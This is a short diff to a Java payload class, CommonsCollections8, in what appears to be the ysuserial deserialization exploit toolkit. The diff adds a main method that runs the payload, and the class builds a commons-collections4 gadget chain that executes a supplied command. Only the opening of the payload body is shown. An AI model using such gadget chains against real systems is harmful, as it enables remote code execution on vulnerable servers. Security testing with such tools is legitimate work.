@@ -10,11 +10,15 @@ import org.su18.ysuserial.payloads.ObjectPayload;
 import org.su18.ysuserial.payloads.annotation.Authors;
 import org.su18.ysuserial.payloads.annotation.Dependencies;
 import org.su18.ysuserial.payloads.util.Gadgets;
+import org.su18.ysuserial.payloads.util.PayloadRunner;
 import org.su18.ysuserial.payloads.util.Reflections;
 
 @Dependencies({"org.apache.commons:commons-collections4:4.0"})
 @Authors({"navalorenzo"})
 public class CommonsCollections8 implements ObjectPayload<TreeBag> {
+	public static void main(final String[] args) throws Exception {
+		PayloadRunner.run(CommonsCollections8.class, args);
+	}
 
 	public TreeBag getObject(String command) throws Exception {
 		Object                 templates   = Gadgets.createTemplatesImpl(command);
